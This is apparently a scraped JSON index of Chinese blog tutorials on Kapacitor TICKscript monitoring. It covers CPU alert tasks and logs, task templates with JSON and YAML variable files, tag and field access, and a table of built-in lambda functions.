.email(&apos;rgweiyaping@hotmail.com&apos;) 3. 启动后查看日志1234[root@tick:/var/lib/kapacitor/task]# kapacitor watch cputs=2019-09-08T22:23:10.011+08:00 lvl=info msg=point service=kapacitor task_master=main task=cpu node=alert5 prefix= name=cpu db= rp= group=cpu=cpu-total,host=influxdb dimension_0=cpu dimension_1=host tag_cpu=cpu-total tag_host=influxdb field_mean_usage_user=1.212475959527466 time=2019-09-08T14:23:00Zts=2019-09-08T22:23:10.011+08:00 lvl=debug msg=&quot;alert triggered&quot; service=kapacitor task_master=main task=cpu node=alert5 level=CRITICAL id=cpu:cpu=cpu-total,host=influxdb event_message=&quot;CPU is to high!&quot; data=&quot;&amp;{cpu map[host:influxdb cpu:cpu-total] [time mean_usage_user] [[2019-09-08 14:23:00 +0000 UTC 1.212475959527466]]}&quot;ts=2019-09-08T22:23:10.012+08:00 lvl=error msg=&quot;failed to send email&quot; service=smtp task=cpu err=&quot;service is not enabled&quot; 从日志中可以看到data=&quot;&amp;{cpu map[host:influxdb cpu:cpu-total] [time mean_usage_user] [[2019-09-08 14:23:00 +0000 UTC 1.212475959527466]]}&quot; groupBy()方法分组后可以将Tag输出到data中。 创建一个批处理的CPU任务Batch Task 要求批量获取 Influxdb数据库中 库名database：telegraf.autogen 测量名measurement：cpu 时间窗口为：2min 计算usage_user近1分钟的平均值 输出到日志中； 解题过程1. 画出DAG图12345graph LR; A(BatchNode)--&gt;B B(QueryNode)--&gt;C C(InfluxQLNode)--&gt;D D(LogNode) 2. 编写 TICKscript123456789// cpu.tickdbrp &quot;telegraf&quot;.&quot;autogen&quot;batch |query(&apos;&apos;&apos;select mean(usage_user) as mean_usage_user from telegraf.autogen.cpu where cpu = &apos;cpu-total&apos; &apos;&apos;&apos;) .period(2m) .every(1m) |log() 3. 启动后查看日志123456789[root@tick:/var/lib/kapacitor/task]# kapacitor watch cputs=2019-09-08T22:07:29.562+08:00 lvl=debug msg=&quot;starting next batch query&quot; service=kapacitor task_master=main task=cpu node=log2 query=&quot;SELECT mean(usage_user) AS mean_usage_user FROM telegraf.autogen.cpu WHERE cpu = &apos;cpu-total&apos; AND time &gt;= &apos;2019-09-08T14:05:29.562830856Z&apos; AND time &lt; &apos;2019-09-08T14:07:29.562830856Z&apos;&quot;ts=2019-09-08T22:07:29.564+08:00 lvl=info msg=&quot;begin batch&quot; service=kapacitor task_master=main task=cpu node=log2 prefix= name=cpu group= time=2019-09-08T22:07:29.562830856+08:00ts=2019-09-08T22:07:29.564+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu node=log2 prefix= name=cpu group= field_mean_usage_user=1.1829510136651877 time=2019-09-08T14:05:29.562830856Zts=2019-09-08T22:07:29.564+08:00 lvl=info msg=&quot;end batch&quot; service=kapacitor task_master=main task=cpu node=log2 prefix= name=cpu group= time=2019-09-08T22:07:29.562830856+08:00ts=2019-09-08T22:08:29.562+08:00 lvl=debug msg=&quot;starting next batch query&quot; service=kapacitor task_master=main task=cpu node=log2 query=&quot;SELECT mean(usage_user) AS mean_usage_user FROM telegraf.autogen.cpu WHERE cpu = &apos;cpu-total&apos; AND time &gt;= &apos;2019-09-08T14:06:29.562830788Z&apos; AND time &lt; &apos;2019-09-08T14:08:29.562830788Z&apos;&quot;ts=2019-09-08T22:08:29.564+08:00 lvl=info msg=&quot;begin batch&quot; service=kapacitor task_master=main task=cpu node=log2 prefix= name=cpu group= time=2019-09-08T22:08:29.562830788+08:00ts=2019-09-08T22:08:29.564+08:00 lvl=info msg=&quot;batch point&quot; service=kapacitor task_master=main task=cpu node=log2 prefix= name=cpu group= field_mean_usage_user=1.1247909374907248 time=2019-09-08T14:06:29.562830788Zts=2019-09-08T22:08:29.564+08:00 lvl=info msg=&quot;end batch&quot; service=kapacitor task_master=main task=cpu node=log2 prefix= name=cpu group= time=2019-09-08T22:08:29.562830788+08:00 总结创建一个生产环境中设定的告警规则cpu的指标是1分钟采集一次，告警规则为： 每分钟检测一次，获取近五分钟的cpu空闲平均值， 如果使用率超过90%，且持续5分钟，则告警。 12345678graph LR; A(StreamNode)--&gt;B B(FromNode)--&gt;C C(WindowNode)--&gt;D D(InfluxQLNode)--&gt;E E(EvalNode)--&gt;F F(LogNode)--&gt; G G(AlertNode) 12345678910111213141516171819202122232425//cpu_alert_stream.tickdbrp &quot;telegraf&quot;.&quot;autogen&quot;stream |from() .measurement(&apos;cpu&apos;) .groupBy(*) |window() .period(5m) .every(1m) |mean(&apos;usage_idle&apos;) .as(&apos;mean_usage_idle&apos;) |eval(lambda: 100.0 - float(&quot;mean_usage_idle&quot;)) .as(&apos;cpu_usage&apos;) .keep() |log() |alert() .crit(lambda: float(&quot;cpu_usage&quot;) &gt; 90.0) .stateChangesOnly() //发送状态更改的事件。每个不同的警报级别OK，INFO，WARNING和CRITICAL都被视为不同的状态。 .message(&apos;{ &quot;type&quot;: &quot;cpu_usage&quot;, &quot;id&quot;: &quot;主机 CPU 使用率大于90%&quot;, &quot;host&quot;: &quot;{{ index .Tags &quot;host&quot; }}&quot;, &quot;description&quot;: &quot;主机{{ index .Tags &quot;host&quot; }} CPU使用率{{ index .Fields &quot;cpu_usage&quot; | printf &quot;%0.2f&quot; }}%,CPU负载过高会导致服务器运行缓慢，应用无法正常使用等问题。请查看CPU使用率高的进程/应用是否为异常导致&quot; }&apos;) Debug 该脚本时，将大于90.0改为0.0 123[root@tick:/var/lib/kapacitor/task]# kapacitor watch cpu_alert_streamts=2019-09-08T22:45:10.018+08:00 lvl=info msg=point service=kapacitor task_master=main task=cpu_alert_stream node=alert6 prefix= name=cpu db= rp= group=cpu=cpu-total,host=influxdb dimension_0=cpu dimension_1=host tag_cpu=cpu-total tag_host=influxdb field_mean_usage_idle=97.94331577862968 field_cpu_usage=2.0566842213703183 time=2019-09-08T14:45:00Zts=2019-09-08T22:45:10.019+08:00 lvl=debug msg=&quot;alert triggered&quot; service=kapacitor task_master=main task=cpu_alert_stream node=alert6 level=CRITICAL id=cpu:cpu=cpu-total,host=influxdb event_message=&quot;{ \\n \\&quot;type\\&quot;: \\&quot;cpu_usage\\&quot;,\\n \\&quot;id\\&quot;: \\&quot;主机 CPU 使用率大于90%\\&quot;,\\n \\&quot;host\\&quot;: \\&quot;influxdb\\&quot;, \\n \\&quot;description\\&quot;: \\&quot;主机influxdb CPU使用率2.06%,CPU负载过高会导致服务器运行缓慢，应用无法正常使用等问题。请查看CPU使用率高的进程/应用是否为异常导致\\&quot;\\n }&quot; data=&quot;&amp;{cpu map[cpu:cpu-total host:influxdb] [time cpu_usage mean_usage_idle] [[2019-09-08 14:45:00 +0000 UTC 2.0566842213703183 97.94331577862968]]}&quot;","link":"/2020/04/14/booboo_tick/kapacitor/05_Kapacitor%E7%9B%91%E6%8E%A7%E6%A1%88%E4%BE%8B/01_%E4%BB%8E%E4%B8%80%E4%B8%AA%E6%9C%80%E5%9F%BA%E6%9C%AC%E7%9A%84cpu.alert%E5%BC%80%E5%A7%8B/"},{"title":"05-Kapacitor监控案例-C-创建任务模板脚本","text":"创建任务模板脚本 使用JSON变量文件来定义新任务 01通过-template和-vars定义新任务以触发CPU使用率警报 02通过-file定义新任务以触发CPU使用率警报 使用YAML变量文件来定义新任务 课堂练习 创建任务模板脚本12345678910111213141516171819202122232425262728293031// Which measurement to consumevar measurement string// Optional where filtervar where_filter = lambda: TRUE// Optional list of group by dimensionsvar groups = [*]// Which field to processvar field string// Warning criteria, has access to &apos;mean&apos; fieldvar warn lambda// Critical criteria, has access to &apos;mean&apos; fieldvar crit lambda// How much data to windowvar window = 5m// The slack channel for alertsvar slack_channel = &apos;#alerts&apos;stream |from() .measurement(measurement) .where(where_filter) .groupBy(groups) |window() .period(window) .every(window) |mean(field) |alert() .warn(warn) .crit(crit) .slack() .channel(slack_channel) 声明模板 1kapacitor define-template generic_mean_alert -tick path/to/template_script.tick 查看模板 1kapacitor show-template generic_mean_alert 使用JSON变量文件来定义新任务01通过-template和-vars定义新任务以触发CPU使用率警报12345678910{ &quot;measurement&quot;: {&quot;type&quot; : &quot;string&quot;, &quot;value&quot; : &quot;cpu&quot; }, &quot;where_filter&quot;: {&quot;type&quot;: &quot;lambda&quot;, &quot;value&quot;: &quot;\\&quot;cpu\\&quot; == &apos;cpu-total&apos;&quot;}, &quot;groups&quot;: {&quot;type&quot;: &quot;list&quot;, &quot;value&quot;: [{&quot;type&quot;:&quot;string&quot;, &quot;value&quot;:&quot;host&quot;},{&quot;type&quot;:&quot;string&quot;, &quot;value&quot;:&quot;dc&quot;}]}, &quot;field&quot;: {&quot;type&quot; : &quot;string&quot;, &quot;value&quot; : &quot;usage_idle&quot; }, &quot;warn&quot;: {&quot;type&quot; : &quot;lambda&quot;, &quot;value&quot; : &quot;\\&quot;mean\\&quot; &lt; 30.0&quot; }, &quot;crit&quot;: {&quot;type&quot; : &quot;lambda&quot;, &quot;value&quot; : &quot;\\&quot;mean\\&quot; &lt; 10.0&quot; }, &quot;window&quot;: {&quot;type&quot; : &quot;duration&quot;, &quot;value&quot; : &quot;1m&quot; }, &quot;slack_channel&quot;: {&quot;type&quot; : &quot;string&quot;, &quot;value&quot; : &quot;#alerts_testing&quot; }} 通过运行带有参数-template和-vars参数的命令来传递模板文件和JSON变量文件 1kapacitor define cpu_alert -template generic_mean_alert -vars cpu_vars.json -dbrp telegraf.autogen 查看 1kapacitor show cpu_alert 02通过-file定义新任务以触发CPU使用率警报12345678910111213{ &quot;template-id&quot;: &quot;generic_mean_alert&quot;, &quot;dbrps&quot;: [{&quot;db&quot;: &quot;telegraf&quot;, &quot;rp&quot;: &quot;autogen&quot;}], &quot;vars&quot;: { &quot;measurement&quot;: {&quot;type&quot; : &quot;string&quot;, &quot;value&quot; : &quot;mem&quot; }, &quot;groups&quot;: {&quot;type&quot;: &quot;list&quot;, &quot;value&quot;: [{&quot;type&quot;:&quot;star&quot;, &quot;value&quot;:&quot;*&quot;}]}, &quot;field&quot;: {&quot;type&quot; : &quot;string&quot;, &quot;value&quot; : &quot;used_percent&quot; }, &quot;warn&quot;: {&quot;type&quot; : &quot;lambda&quot;, &quot;value&quot; : &quot;\\&quot;mean\\&quot; &gt; 80.0&quot; }, &quot;crit&quot;: {&quot;type&quot; : &quot;lambda&quot;, &quot;value&quot; : &quot;\\&quot;mean\\&quot; &gt; 90.0&quot; }, &quot;window&quot;: {&quot;type&quot; : &quot;duration&quot;, &quot;value&quot; : &quot;10m&quot; }, &quot;slack_channel&quot;: {&quot;type&quot; : &quot;string&quot;, &quot;value&quot; : &quot;#alerts_testing&quot; } }} 通过-file,该参数与该任务定义文件的新的内容，替换命令行参数template，dbrp和vars。 1kapacitor define mem_alert -file mem_template_task.json 使用YAML变量文件来定义新任务使用YAML，任务定义文件mem_template_task.yaml如下所示： 示例：YAML中的任务定义文件 12345678910111213141516171819202122232425262728template-id: generic_mean_alertdbrps:- db: telegraf rp: autogenvars: measurement: type: string value: mem groups: type: list value: - type: star value: &quot;*&quot; field: type: string value: used_percent warn: type: lambda value: &apos;&quot;mean&quot; &gt; 80.0&apos; crit: type: lambda value: &apos;&quot;mean&quot; &gt; 90.0&apos; window: type: duration value: 10m slack_channel: type: string value: &quot;#alerts_testing&quot; 然后可以使用file如前所示的参数定义任务。 1kapacitor define mem_alert -file mem_template_task.yaml 课堂练习要求：判断平均值和指定阈值对比触发告警的模板，通过配置yml变量文件来定义任务。 时序数据 1234567891011121314151617181920212223InfluxDB shell version: 1.7.7&gt; use telegrafUsing database telegraf&gt; show field keys from cpuname: cpufieldKey fieldType-------- ---------usage_guest floatusage_guest_nice floatusage_idle floatusage_iowait floatusage_irq floatusage_nice floatusage_softirq floatusage_steal floatusage_system floatusage_user float&gt; show tag keys from cpuname: cputagKey------cpuhost 模板template_alert.tick 123456789101112131415161718192021222324252627282930// 测量名var measurement string// 过滤条件var where_filter = lambda: TRUE// 分组var groups = [*]// 时间窗口var window duration// 执行频率var every duration// 字段var field string// 触发告警的表达式var crit lambda// 告警描述var message stringstream |from() .measurement(measurement) .where(where_filter) .groupBy(groups) |window() .period(window) .every(every) |mean(field) |alert() .crit(crit) .stateChangesOnly() .message(message) cpu空闲告警的变量文件cpu_idle.yml 123456789101112131415161718192021222324252627282930313233template-id: mean_alertdbrps:- db: telegraf rp: autogenvars: measurement: type: string value: cpu groups: type: list value: - type: star value: &quot;*&quot; field: type: string value: usage_idle crit: type: lambda value: &apos;&quot;mean&quot; &lt; 10.0&apos; window: type: duration value: 5m every: type: duration value: 1m message: type: string value: &apos;{ &quot;type&quot;: &quot;cpu_usage&quot;, &quot;id&quot;: &quot;主机 CPU 使用率大于90%&quot;, &quot;host&quot;: &quot;{{ index .Tags &quot;host&quot; }}&quot;, &quot;description&quot;: &quot;主机{{ index .Tags &quot;host&quot; }} CPU使用率{{ index .Fields &quot;cpu_usage&quot; | printf &quot;%0.2f&quot; }}%,CPU负载过高会导致服务器运行缓慢，应用无法正常使用等问题。请查看CPU使用率高的进程/应用是否为异常导致&quot; }&apos; 操作过程： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148[root@tick:/var/lib/kapacitor/task]# vim template_alert.tick[root@tick:/var/lib/kapacitor/task]# kapacitor define-template mean_alert -tick template_alert.tick[root@tick:/var/lib/kapacitor/task]# kapacitor show-template mean_alertID: mean_alertError:Type: streamCreated: 09 Sep 19 21:46 CSTModified: 09 Sep 19 21:50 CSTTICKscript:// 测量名var measurement string// 过滤条件var where_filter = lambda: TRUE// 分组var groups = [*]// 时间窗口var window duration// 执行频率var every duration// 字段var field string// 触发告警的表达式var crit lambda// 告警描述var message stringstream |from() .measurement(measurement) .where(where_filter) .groupBy(groups) |window() .period(window) .every(every) |mean(field) |alert() .crit(crit) .stateChangesOnly() .message(message)Vars:Name Type Default Value Description crit lambda &lt;required&gt; 触发告警的表达式 every duration &lt;required&gt; 执行频率 field string &lt;required&gt; 字段 groups list [*] 分组 measurement string &lt;required&gt; 测量名 message string &lt;required&gt; 告警描述 where_filter lambda TRUE 过滤条件 window duration &lt;required&gt; 时间窗口 DOT:digraph mean_alert {stream0 -&gt; from1;from1 -&gt; window2;window2 -&gt; mean3;mean3 -&gt; alert4;}[root@tick:/var/lib/kapacitor/task]# vim cpu_idle.yml[root@tick:/var/lib/kapacitor/task]# kapacitor define cpu_idle_alert -file cpu_idle.yml[root@tick:/var/lib/kapacitor/task]# kapacitor list tasksID Type Status Executing Databases and Retention Policiescpu_idle_alert stream disabled false [&quot;telegraf&quot;.&quot;autogen&quot;][root@tick:/var/lib/kapacitor/task]# kapacitor enable cpu_idle_alert[root@tick:/var/lib/kapacitor/task]# kapacitor show cpu_idle_alertID: cpu_idle_alertError:Template: mean_alertType: streamStatus: enabledExecuting: trueCreated: 09 Sep 19 22:04 CSTModified: 09 Sep 19 22:05 CSTLastEnabled: 09 Sep 19 22:05 CSTDatabases Retention Policies: [&quot;telegraf&quot;.&quot;autogen&quot;]TICKscript:// 测量名var measurement string// 过滤条件var where_filter = lambda: TRUE// 分组var groups = [*]// 时间窗口var window duration// 执行频率var every duration// 字段var field string// 触发告警的表达式var crit lambda// 告警描述var message stringstream |from() .measurement(measurement) .where(where_filter) .groupBy(groups) |window() .period(window) .every(every) |mean(field) |alert() .crit(crit) .stateChangesOnly() .message(message)Vars:Name Type Value crit lambda &quot;mean&quot; &lt; 10.0 every duration 1m0s field string usage_idle groups list [*] measurement string cpu message string { &quot;type&quot;: &quot;cpu_usage&quot;, &quot;id&quot;: &quot;主机 CPU 使用率大于90%&quot;, &quot;host&quot;: &quot;{{ index .Tags &quot;host&quot; }}&quot;, &quot;description&quot;: &quot;主机{{ index .Tags &quot;host&quot; }} CPU使用率{{ index .Fields &quot;cpu_usage&quot; | printf &quot;%0.2f&quot; }}%,CPU负载过高会导致服务器运行缓慢，应用无法正常使用等问题。请查看CPU使用率高的进程/应用是否为异常导致&quot; }window duration 5m0s DOT:digraph cpu_idle_alert {graph [throughput=&quot;0.00 points/s&quot;];stream0 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;0&quot; ];stream0 -&gt; from1 [processed=&quot;0&quot;];from1 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;0&quot; ];from1 -&gt; window2 [processed=&quot;0&quot;];window2 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;0&quot; ];window2 -&gt; mean3 [processed=&quot;0&quot;];mean3 [avg_exec_time_ns=&quot;0s&quot; errors=&quot;0&quot; working_cardinality=&quot;0&quot; ];mean3 -&gt; alert4 [processed=&quot;0&quot;];alert4 [alerts_inhibited=&quot;0&quot; alerts_triggered=&quot;0&quot; avg_exec_time_ns=&quot;0s&quot; crits_triggered=&quot;0&quot; errors=&quot;0&quot; infos_triggered=&quot;0&quot; oks_triggered=&quot;0&quot; warns_triggered=&quot;0&quot; working_cardinality=&quot;0&quot; ];}","link":"/2020/04/14/booboo_tick/kapacitor/05_Kapacitor%E7%9B%91%E6%8E%A7%E6%A1%88%E4%BE%8B/03_%E5%88%9B%E5%BB%BA%E4%BB%BB%E5%8A%A1%E6%A8%A1%E6%9D%BF%E8%84%9A%E6%9C%AC/"},{"title":"02-TICKscript语言-E-变量标签和字段","text":"TICKscript变量标签和字段 访问变量 访问标签和字段 其他访问 TICKscript变量标签和字段TICKscript不仅可以使用自定义的变量，还可以使用来自数据库中的Tag和Field。 访问变量要访问TICKscript变量，只需使用其标识符（变量名）即可。 12345var db = &apos;telegraf&apos;...var data = stream |from() .database(db) db变量的值是一个字符串’telegraf’，然后在.database()链接方法中访问该变量. 访问标签和字段 对象 声明 访问 字符串类型的变量 声明时使用单引号或三引号 访问时使用变量名即可 Tag和Field 访问Lambda表达式中的tag或field，必须使用双引号 Tag和Field 访问方法调用中的tag或field，必须使用单引号 为什么调用Tag和Field的符号不同呢？ 在方法调用中，这些实质上是字符串文字，供节点用于匹配数据库中的标记Tag或字段值Field。 1234567891011 // Data framevar data = stream |from() .database(&apos;telegraf&apos;) .retentionPolicy(&apos;autogen&apos;) .measurement(&apos;cpu&apos;) .groupBy(&apos;host&apos;) .where(lambda: &quot;cpu&quot; == &apos;cpu-total&apos;) |eval(lambda: 100.0 - &quot;usage_idle&quot;) .as(&apos;used&apos;) ... 在示例中，访问来自数据帧的两个值 在where()方法调用中，lambda表达式使用Tag标签cpu进行数据过滤，仅匹配cpu = &apos;cpu-total&apos;的值。 链接方法eval()还采用lambda表达式访问Field字段usage-idle以计算100.0 - &quot;usage_idle&quot;来获取CPU当前的使用率used。 groupBy()方法使用字符串host与数据系列中的标记名称Tag匹配。然后，它将按此标记对数据进行分组。 命名的lambda表达式结果: Lambda表达式结果被命名并使用as()方法作为字段添加到数据集中。 as()方法的功能就像InfluxQL中的AS关键字一样。 其他访问后续补充","link":"/2020/04/14/booboo_tick/kapacitor/02_TICKscript%E8%AF%AD%E8%A8%80/E_TICKscript%E5%8F%98%E9%87%8F%E6%A0%87%E7%AD%BE%E5%92%8C%E5%AD%97%E6%AE%B5/"},{"title":"02-TICKscript语言-I-Lambda表达式","text":"TICKscript Lambda表达式 概述 简介 内置函数 有状态函数 sigma可用于定义强大的告警 知识点-平均偏差 无状态函数 类型转换函数 判断存在的函数 时间函数 数学函数 字符串函数 人性化函数 条件函数 TICKscript Lambda表达式Lambda表达式官方帮助 函数帮助 概述TICKscript使用lambda表达式定义数据点的转换，并定义充当过滤器的布尔条件。 简介Lambda表达式包含： 数学运算 布尔运算 内部函数调用 或三者的组合 TICKscript尝试类似于InfluxQL，因为您在InfluxQL WHERE子句中使用的大多数表达式将作为TICKscript中的表达式使用，但具有自己的语法： lambda表达式都以关键字lambda:开头。 所有字段Field或标记Tag 的标识符必须加双引号。 相等的比较运算符为==不是=。 内置函数内置函数分为： 内置函数 数量 Stateful functions 有状态函数 3 Stateless functions 无状态函数 78 Type conversion functions 类型转换函数 5 Existence 存在函数 1 Time functions 时间函数 7 Math functions 数学函数 42 String functions 字符串函数 21 Human string functions 人性化函数 1 Conditional functions 条件函数 1 有状态函数 No. 函数 返回值 描述 1 count() int64 返回表达式的计算次数 2 sigma(value ) float64 计算给定值远离运行平均值的标准偏差数。每次评估表达式时，都会更新运行平均值和标准差。 3 spread(value ) float64 计算传递给它的所有值的运行范围。范围是收到的最大值和最小值之间的差异。 sigma可用于定义强大的告警每次计算表达式时，它都会更新正在运行的统计信息，然后返回偏差。 sigma(&quot;value&quot;) &gt; 3.0表示评估收到的数据点流的平均值的标准偏差： 如果小于等于 3.0，则返回 False； 如果超过3.0，则返回True。 这样的表达式可以在TICKscript内部使用来定义强大的警报。 123456stream |from() ... |alert() // use an expression to define when an alert should go critical. .crit(lambda: sigma(&quot;value&quot;) &gt; 3.0) 知识点-平均偏差什么是平均偏差？ 平均偏差是数列中各项数值与其算术平均数的离差绝对值的算术平均数。平均偏差是用来测定数列中各项数值对其平均数离势程度的一种尺度。平均偏差可分为简单平均偏差和加权平均偏差。 定义 在统计中，如果要反映出所有原数据间的差异，就要在各原数据之间进行差异比较，当原数据较多时，进行两两比较就很麻烦，因此需要找到一个共同的比较标准，取每个原数据值与标准值进行比较。这个标准值就是算数平均数。 平均偏差就是每个原数据值与算数平均数之差的绝对值的均值，用符号A.D.(average deviation)表示。平均偏差是一种平均离差。离差是总体各单位的标志值与算术平均数之差。因离差和为零，离差的平均数不能将离差和除以离差的个数求得，而必须将离差取绝对数来消除正负号。 平均偏差是反映各标志值与算术平均数之间的平均差异。平均偏差越大，表明各标志值与算术平均数的差异程度越大，该算术平均数的代表性就越小；平均偏差越小，表明各标志值与算术平均数的差异程度越小，该算术平均数的代表性就越大。 平均偏差又有简单平均偏差和加权平均偏差之分。 计算 简单平均偏差如果原数据未分组，则计算平均偏差的公式为：$$A.D. =\\frac{\\sum\\mid x-\\overline x \\mid}{n}$$该式称为简单平均偏差。 举例：计算cpu每个点的平均偏差值 10 11 9 8 12 11 第一个点的值为10，平均偏差为0 第二个点的值为11，平均偏差为0.5 第三个点的值为9，平均偏差为0.82 第四个点的值为8，平均偏差为1.12 第五个点的值为12，平均偏差为1.41 第六个点的值为11，平均偏差为1.34 1234* 计算平均值* 计算每个点与平均值的差值的绝对值* 计算差值的和* 差值和除以总次数 python计算脚本 1234567891011121314151617181920import numpydef cal_mean_std(sum_list_in): # type: (list) -&gt; tuple N = sum_list_in.__len__() narray = numpy.array(sum_list_in) sum = narray.sum() mean = sum / N narray_dev = narray - mean narray_dev = narray_dev * narray_dev sum_dev = narray_dev.sum() DEV = float(sum_dev) / float(N) STDEV = numpy.math.sqrt(DEV) return round(mean,2), round(DEV,2), round(STDEV,2)sum_list_in = [10,11,9,8,12,11]mean, DEV, STDEV=cal_mean_std(sum_list_in)print(mean, DEV, STDEV) mean 平均值 dev 方差 stdev 标准差 加权平均偏差在分组情况下，平均偏差的计算公式为：该式称为加权平均偏差。$$A.D. =\\frac{\\sum\\mid x-\\overline x \\mid f}{n f}$$ 无状态函数类型转换函数 No. 函数 返回值 描述 1 bool(value) True/False 将字符串和数字转换为布尔值 2 int(value) int64 强制将字符串或float64转换为int64 3 float(value) float64 制将字符串或int64转换为float64 4 string(value) string 将bool，int64或float64转换为字符串 5 duration(value int64|float64, unit duration) duration 将int64或float64转换为持续时间 判断存在的函数 No. 函数 返回值 解释 1 |where(lambda: isPresent(&quot;myfield&quot;)) True/False 判断myfield是否存在 该函数在where节点中使用，根据指定的字段或标记键是否存在返回布尔值。用于过滤数据这是缺少指定的字段或标记。 时间函数 No. 函数 返回值 描述 1 unixNano(t time) int64 Unix时间 2 minute(t time) int64 分钟 3 hour(t time) int64 小时 4 weekday(t time) int64 周 [0,6], 0 is Sunday 5 day(t time) int64 the day within the month: range [1,31] 6 month(t time) int64 the month within the year: range [1,12] 7 year(t time) int64 年 例如 1lambda: hour(&quot;time&quot;) &gt;= 9 AND hour(&quot;time&quot;) &lt; 19 数学函数 No. 函数 返回值 描述 1 abs(x) float64 Abs返回x的绝对值。 2 acos(x) float64 Acos以弧度为单位返回x的反余弦。 3 acosh(x) float64 Acosh返回x`的反双曲余弦值。 4 asin(x) float64 Asin以弧度为单位返回x的反正弦值。 5 asinh(x) float64 Asinh返回x的反双曲正弦值。 6 atan(x) float64 Atan以弧度为单位返回x的反正切值。 7 atan2(y,x) float64 Atan2返回y / x的反正切，使用二者的符号确定返回值的象限。 8 atanh(x) float64 Atanh返回x的反双曲正切。 9 cbrt(x) float64 Cbrt返回x的立方根。 10 ceil(x) float64 Ceil返回大于或等于x的最小整数值。 11 cos(x) float64 Cos返回弧度参数x的余弦值。 12 cosh(x) float64 Cosh返回x的双曲余弦值。 13 erf(x) float64 Erf返回x的错误函数。 14 erfc(x) float64 Erfc返回x的互补误差函数。 15 exp(x) float64 Exp返回e ** x，x的base-e指数。 16 exp2(x) float64 Exp2返回2 ** x，x的基数为2的指数。 17 expm1(x) float64 Expm1返回e ** x - 1，x的基数为e的指数减1.当x接近零时，它比Exp(x）-1更准确。 18 floor(x) float64 Floor返回小于或等于x的最大整数值。 19 gamma(x) float64 Gamma返回x的Gamma函数。 20 hypot(p,q) float64 Hypot返回Sqrt(p * p + q * q），注意避免不必要的溢出和下溢。 21 j0(x) float64 J0返回第一类的零阶贝塞尔函数。 22 j1(x) float64 J1返回第一类的一阶贝塞尔函数。 23 jn（n int64，x) float64 Jn返回第一种order-n Bessel函数。 24 log(x) float64 Log返回x的自然对数。 25 log10(x) float64 Log10返回x的十进制对数。 26 log1p(x) float64 Log1p返回1的自然对数加上其参数x。当x接近零时，它比Log(1 + x）更准确。 27 log2(x) float64 Log2返回x的二进制对数。 28 logb(x) float64 Logb返回x的二进制指数。 29 max(x,y) float64 Max返回x或y中较大的一个。 30 min(x,y) float64 Min返回x或y中较小的一个。 31 mod(x,y) float64 Mod返回x / y的浮点余数。结果的大小小于y，其符号与x的符号一致。 32 pow(x,y) float64 Pow返回x ** y，y的base-x指数。 33 pow10(x int64 float64 Pow10返回10 ** e，e的基数为10的指数。 34 sin(x) float64 Sin返回弧度参数x的正弦值。 35 sinh(x) float64 Sinh返回x的双曲正弦值。 36 sqrt(x) float64 Sqrt返回x的平方根。 37 tan(x) float64 Tan返回弧度参数x的正切值。 38 tanh(x) float64 Tanh返回x的双曲正切。 39 trunc(x) float64 Trunc返回x的整数值。 40 y0(x) float64 Y0返回第二种零阶贝塞尔函数。 41 y1(x) float64 Y1返回第二种顺序一贝塞尔函数。 42 yn(n int64,x) float64 Yn返回第二种order-n 贝塞尔函数。 字符串函数 No. 函数 返回值 描述 1 strContains(s, substr) bool StrContains报告substr是否在s内。 2 strContainsAny(s, chars) bool StrContainsAny报告字符中的任何Unicode代码点是否在s内。 3 strCount(s, sep) int64 StrCount计算s中非重叠sep实例的数量。如果sep是空字符串，则Count返回1 + s中的Unicode代码点数。 4 strHasPrefix(s, prefix) bool StrHasPrefix测试字符串s是否以prefix开头。 5 strHasSuffix(s, suffix) bool StrHasSuffix测试字符串s是否以后suffix缀结尾。 6 strIndex(s, sep) int64 StrIndex返回s中第一个sep实例的索引，如果s中不存在sep，则返回-1。 7 strIndexAny(s, chars) int64 StrIndexAny从1中的字符返回任何Unicode代码点的第一个实例的索引，如果s中没有来自chars的Unicode代码点，则返回-1。 8 strLastIndex(s, sep) int64 StrLastIndex返回s中最后一个sep实例的索引，如果s中不存在sep，则返回-1。 9 strLastIndexAny(s, chars) int64 StrLastIndexAny从s中的字符返回任何Unicode代码点的最后一个实例的索引，如果s中没有来自chars的Unicode代码点，则返回-1。 10 strLength(s) int64 StrLength返回字符串的长度。 11 strReplace(s, old, new), n int64 string StrReplace返回字符串s的副本，其中前n个非重叠实例由new替换。 12 strSubstring(s), start, stop int64 string StrSubstring根据给定的索引返回一个子字符串，strSubstring(str,start,stop)相当于Go中的str [start：stop]。 13 strToLower(s) string StrToLower返回字符串s的副本，其中所有Unicode字母都映射到它们的小写字母。 14 strToUpper(s) string StrToUpper返回字符串s的副本，其中所有Unicode字母都映射到它们的大写字母。 15 strTrim(s, cutset) string StrTrim返回字符串s的一个片段，其中包含cutset中包含的所有前导和尾随Unicode代码点。 16 strTrimLeft(s, cutset) string StrTrimLeft返回字符串s的一个片段，其中包含cutset中包含的所有前导Unicode代码点。 17 strTrimPrefix(s, prefix) string StrTrimPrefix返回s而没有提供的前导前缀字符串。如果s不以prefix开头，则返回s不变。 18 strTrimRight(s, cutset) string StrTrimRight返回字符串s的一个切片，并删除了cutset中包含的所有尾随Unicode代码点。 19 strTrimSpace(s) string StrTrimSpace返回字符串s的一部分，删除所有前导和尾随空格，如Unicode所定义。 20 strTrimSuffix(s, suffix) string StrTrimSuffix返回s而没有提供的尾随后缀字符串。如果s不以后缀结尾，则s保持不变。 21 regexReplace(r regex, s, pattern) string RegexReplace将输入字符串中正则表达式的匹配替换为输出字符串。例如regexReplace(/a(b*)c/, ‘abbbc’, ‘group is $1’) -&gt; ‘group is bbb’。如果未找到匹配项，则返回原始字符串。 人性化函数 No. 函数 返回值 描述 1 humanBytes(value) string 将具有单位字节的int64或float64转换为表示字节数的人类可读字符串。 条件函数 No. 函数 返回值 描述 1 if(condition, true expression, false expression) True/False 根据第一个参数的值返回其操作数的结果。第二个和第三个参数必须返回相同的类型。 例： 12|eval(lambda: if(&quot;field&quot; &gt; threshold AND &quot;field&quot; != 0, &apos;true&apos;, &apos;false&apos;)) .as(&apos;value&apos;) value上例中字段的值将是字符串，true或者false取决于作为第一个参数传递的条件。 